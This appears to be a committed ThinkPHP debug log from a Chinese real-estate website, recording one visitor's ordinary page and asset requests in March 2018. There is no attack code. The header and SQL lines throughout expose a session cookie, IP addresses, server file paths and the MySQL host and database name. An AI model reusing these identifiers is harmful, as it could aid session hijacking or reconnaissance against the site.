+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/entrust/entrust.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:51+08:00 ] 139.129.142.167 119.4.212.13 GET /extend/ajax-login/functions.js
+[ info ] www.yingdizichan.com/extend/ajax-login/functions.js [运行时间：0.027229s][吞吐率：36.73req/s] [内存消耗：1,883.40kb] [文件加载：38]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'extend',
+    1 => 'ajax-login',
+    2 => 'functions.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/entrust/entrust.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:52+08:00 ] 139.129.142.167 119.4.212.13 GET /index/entrust/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/entrust/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.034200s][吞吐率：29.24req/s] [内存消耗：2,287.74kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'entrust',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/entrust/entrust.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:52+08:00 ] 139.129.142.167 119.4.212.13 GET /index/entrust/push-1.js
+[ info ] www.yingdizichan.com/index/entrust/push-1.js [运行时间：0.034576s][吞吐率：28.92req/s] [内存消耗：2,287.08kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'entrust',
+    2 => 'push-1.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/entrust/entrust.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:53+08:00 ] 139.129.142.167 119.4.212.13 GET /index/entrust/enrental.html
+[ info ] www.yingdizichan.com/index/entrust/enrental.html [运行时间：0.033702s][吞吐率：29.67req/s] [内存消耗：2,318.81kb] [文件加载：44]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'entrust',
+    2 => 'enrental',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/entrust/entrust.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Entrust->enRental[ /data/home/qxu1590200456/htdocs/application/index/controller/Entrust.php ]
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/entrust/enrental.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:56+08:00 ] 139.129.142.167 119.4.212.13 GET /index/entrust/entrust.html
+[ info ] www.yingdizichan.com/index/entrust/entrust.html [运行时间：0.035937s][吞吐率：27.83req/s] [内存消耗：2,321.77kb] [文件加载：44]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'entrust',
+    2 => 'entrust',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404,1520071613; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071613',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/sale/sale.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Entrust->entrust[ /data/home/qxu1590200456/htdocs/application/index/controller/Entrust.php ]
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/entrust/entrust.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:56+08:00 ] 139.129.142.167 119.4.212.13 GET /extend/ajax-login/functions.js
+[ info ] www.yingdizichan.com/extend/ajax-login/functions.js [运行时间：0.027175s][吞吐率：36.80req/s] [内存消耗：1,883.80kb] [文件加载：38]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'extend',
+    1 => 'ajax-login',
+    2 => 'functions.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404,1520071613; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071613',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/entrust/entrust.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:56+08:00 ] 139.129.142.167 119.4.212.13 GET /index/entrust/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/entrust/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.033890s][吞吐率：29.51req/s] [内存消耗：2,287.74kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'entrust',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404,1520071613; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071613',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/entrust/entrust.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:56+08:00 ] 139.129.142.167 119.4.212.13 GET /index/entrust/push-1.js
+[ info ] www.yingdizichan.com/index/entrust/push-1.js [运行时间：0.034925s][吞吐率：28.63req/s] [内存消耗：2,287.76kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'entrust',
+    2 => 'push-1.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404,1520071613; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071613',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/entrust/entrust.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:58+08:00 ] 139.129.142.167 119.4.212.13 GET /
+[ info ] www.yingdizichan.com/ [运行时间：0.056214s][吞吐率：17.79req/s] [内存消耗：4,321.40kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404,1520071613; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071613',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/entrust/entrust.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004376s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.002002s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001055s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001491s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001075s ]
+---------------------------------------------------------------
+[ 2018-03-03T18:06:59+08:00 ] 139.129.142.167 119.4.212.13 POST /extend/ajax-login/enews.php
+[ info ] www.yingdizichan.com/extend/ajax-login/enews.php [运行时间：0.027299s][吞吐率：36.63req/s] [内存消耗：1,885.93kb] [文件加载：38]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'extend',
+    1 => 'ajax-login',
+    2 => 'enews.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '13',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'origin' => 'http://www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+  'x-requested-with' => 'XMLHttpRequest',
+)
+[ info ] [ PARAM ] array (
+  'enews' => 'LoginJS',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:07:04+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/about.html
+[ info ] www.yingdizichan.com/index/about/about.html [运行时间：0.034083s][吞吐率：29.34req/s] [内存消耗：2,303.09kb] [文件加载：44]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'about',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\About->about[ /data/home/qxu1590200456/htdocs/application/index/controller/About.php ]
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/about/about.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:07:04+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.034199s][吞吐率：29.24req/s] [内存消耗：2,269.36kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/about.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:07:04+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/push-1.js
+[ info ] www.yingdizichan.com/index/about/push-1.js [运行时间：0.036869s][吞吐率：27.12req/s] [内存消耗：2,269.29kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'push-1.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/about.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:07:09+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/employ.html
+[ info ] www.yingdizichan.com/index/about/employ.html [运行时间：0.053105s][吞吐率：18.83req/s] [内存消耗：4,303.86kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'employ',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/about.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\About->employ[ /data/home/qxu1590200456/htdocs/application/index/controller/About.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/about/employ.html [ array (
+  0 => 'employ',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004356s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_employ` [ RunTime:0.002184s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_employ` [ RunTime:0.001220s ]
+---------------------------------------------------------------
+[ 2018-03-03T18:07:10+08:00 ] 139.129.142.167 119.4.212.13 GET /public/static/stand/images/telephone.png
+[ info ] www.yingdizichan.com/public/static/stand/images/telephone.png [运行时间：0.029501s][吞吐率：33.90req/s] [内存消耗：1,884.63kb] [文件加载：38]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'public',
+    1 => 'static',
+    2 => 'stand',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/public/static/stand/css/style.css',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'telephone.png',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:07:10+08:00 ] 139.129.142.167 119.4.212.13 GET /public/static/stand/images/home_icon.png
+[ info ] www.yingdizichan.com/public/static/stand/images/home_icon.png [运行时间：0.029915s][吞吐率：33.43req/s] [内存消耗：1,884.63kb] [文件加载：38]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'public',
+    1 => 'static',
+    2 => 'stand',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/public/static/stand/css/style.css',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'home_icon.png',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:07:10+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.034648s][吞吐率：28.86req/s] [内存消耗：2,269.36kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/employ.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:07:10+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/push-1.js
+[ info ] www.yingdizichan.com/index/about/push-1.js [运行时间：0.039466s][吞吐率：25.34req/s] [内存消耗：2,269.29kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'push-1.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
